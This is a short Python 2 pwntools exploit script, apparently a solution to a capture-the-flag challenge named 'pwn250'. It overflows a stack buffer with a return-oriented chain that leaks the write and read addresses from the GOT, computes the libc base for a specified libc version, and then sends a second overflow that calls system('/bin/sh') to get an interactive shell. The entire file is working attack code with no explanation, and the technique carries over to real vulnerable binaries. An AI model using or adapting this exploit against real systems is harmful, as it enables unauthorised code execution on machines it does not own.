from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./pwn250')
else :
	print 'Remote server is disabled'
	exit()

# Gadget
pop_1_ret = 0x400633
pop_3_ret = 0x40056A

# Address
write_plt = 0x400430
write_got = 0x601018
read_got = 0x601020

payload = 'A'*(0x80+8)
payload += p64(pop_3_ret)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)
payload += p64(write_plt)
payload += p64(pop_3_ret)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(write_plt)
payload += p64(0x400571)   # func: here

p.write(payload)

write_addr = u64(p.recv(8))
read_addr = u64(p.recv(8))

print '[Exploit] write = '+hex(write_addr)
print '[Exploit] read = '+hex(read_addr)

# libc : libc6_2.29-0ubuntu2_amd64

libc_base = read_addr-0x10CF70
system_addr = libc_base+0x52FD0
str_bin_sh_addr = libc_base+0x1AFB84

payload = 'A'*(0x80+8)
payload += p64(pop_1_ret)
payload += p64(str_bin_sh_addr)
payload += p64(system_addr)

p.write(payload)

p.interactive()
